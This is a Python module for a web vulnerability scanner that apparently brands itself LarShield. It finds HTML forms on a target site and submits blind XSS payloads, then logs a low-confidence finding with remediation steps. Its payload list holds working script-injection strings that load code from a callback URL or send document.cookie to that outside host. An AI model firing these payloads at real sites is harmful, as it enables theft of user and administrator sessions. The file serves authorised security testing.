import re
import urllib.request
import urllib.parse

from scanners.base_scanner import BaseScanner, XSS_CALLBACK_URL

BLIND_XSS_PAYLOADS = [
    f'"><script src="{XSS_CALLBACK_URL}/xss.js"></script>',
    f"';new Image().src='{XSS_CALLBACK_URL}/?c='+document.cookie//",
    f'"><img src=x onerror="fetch(\'{XSS_CALLBACK_URL}/?c=\'+btoa(document.cookie))">',
]

FORM_INPUT_TYPES = ["text", "email", "search", "url", "tel", "textarea"]


class BlindXssScanner(BaseScanner):
    SCANNER_NAME = "Blind XSS (Out-of-Band) Scanner"
    _SCANNER_KEY = "blind_xss"

    def __init__(self, scan_id, target, domain, **kwargs):
        super().__init__(scan_id, target, domain, **kwargs)

    def run(self) -> list:
        self.log("INFO", f"[BlindXSS] Injecting blind XSS payloads into forms on {self.target}...")
        self.log("INFO", f"[BlindXSS] Using callback URL: {XSS_CALLBACK_URL}")
        try:
            req = urllib.request.Request(
                self.target, headers=self._make_headers()
            )
            with urllib.request.urlopen(req, timeout=8, context=self.get_ssl_context()) as r:
                html = r.read().decode("utf-8", errors="ignore")
        except Exception as e:
            self.log("WARNING", f"[BlindXSS] Error: {e}")
            return self.vulns

        forms = self._parse_forms(html)
        if not forms:
            self.log("INFO", "[BlindXSS] No forms found to inject into.")
            return self.vulns

        injected_endpoints = []
        for form in forms[:5]:
            action = form.get("action") or self.target
            if not action.startswith("http"):
                from urllib.parse import urljoin
                action = urljoin(self.target, action)
            fields = form.get("fields", [])
            if not fields:
                continue
            payload = BLIND_XSS_PAYLOADS[0]
            post_data = {}
            for field in fields:
                field_type = field.get("type", "text").lower()
                if field_type in FORM_INPUT_TYPES:
                    post_data[field["name"]] = payload
                elif field_type == "hidden":
                    post_data[field["name"]] = field.get("value", "")
                elif field_type == "email":
                    post_data[field["name"]] = "test@test.com" + payload
            if post_data:
                try:
                    data = urllib.parse.urlencode(post_data).encode()
                    req = urllib.request.Request(
                        action,
                        data=data,
                        method=form.get("method", "POST").upper(),
                        headers={
                            "User-Agent": "LarShield/2.0",
                            "Content-Type": "application/x-www-form-urlencoded",
                        },
                    )
                    urllib.request.urlopen(req, timeout=5, context=self.get_ssl_context())
                    injected_endpoints.append(action)
                    self.log("INFO", f"[BlindXSS] Payload injected into: {action}")
                except Exception as e:
                    self.log("ERROR", f"[BlindXSS] Injection error: {e}")
                    injected_endpoints.append(action + " (injection attempted)")

        if injected_endpoints:
            self.add_vuln(
                title=f"Blind XSS Payloads Submitted to {len(injected_endpoints)} Form(s) — Awaiting Callback",
                severity="Low",
                category="Blind XSS",
                cvss_score=0.0,
                confidence="Low",
                description=(
                    f"Out-of-band XSS payloads were submitted to {len(injected_endpoints)} form endpoint(s).\n"
                    f"Callback listener configured at: {XSS_CALLBACK_URL}\n\n"
                    + "\n".join(f"- `{e}`" for e in injected_endpoints)
                    + "\n\n**This is NOT a confirmed finding.** Blind XSS requires an external callback "
                    "to verify execution. Monitor your XSS hunter / callback server for incoming "
                    f"requests from `{XSS_CALLBACK_URL}`. If a callback is received, escalate to Critical."
                ),
                remediation=(
                    "1. If a callback IS received: Apply output encoding on ALL stored user data rendered in admin panels.\n"
                    "2. Implement a strict CSP on admin interfaces.\n"
                    "3. Use DOMPurify on any admin UI that renders user-submitted content.\n"
                    "4. If no callback is received within 24h, the forms are likely not vulnerable."
                ),
            )
        else:
            self.log("SUCCESS", "[BlindXSS] No injectable forms found.")
        return self.vulns

    def _parse_forms(self, html):
        forms = []
        for form_html in re.findall(r"<form[^>]*>.*?</form>", html, re.S | re.I):
            action = re.search(r'action=["\']([^"\']*)["\']', form_html, re.I)
            method = re.search(r'method=["\']([^"\']*)["\']', form_html, re.I)
            fields = []
            for inp in re.findall(r"<(?:input|textarea)[^>]*>", form_html, re.I):
                name_m = re.search(r'name=["\']([^"\']+)["\']', inp, re.I)
                type_m = re.search(r'type=["\']([^"\']+)["\']', inp, re.I)
                val_m = re.search(r'value=["\']([^"\']*)["\']', inp, re.I)
                if name_m:
                    fields.append({
                        "name": name_m.group(1),
                        "type": type_m.group(1) if type_m else "text",
                        "value": val_m.group(1) if val_m else "",
                    })
            forms.append({
                "action": action.group(1) if action else "",
                "method": method.group(1) if method else "POST",
                "fields": fields,
            })
        return forms
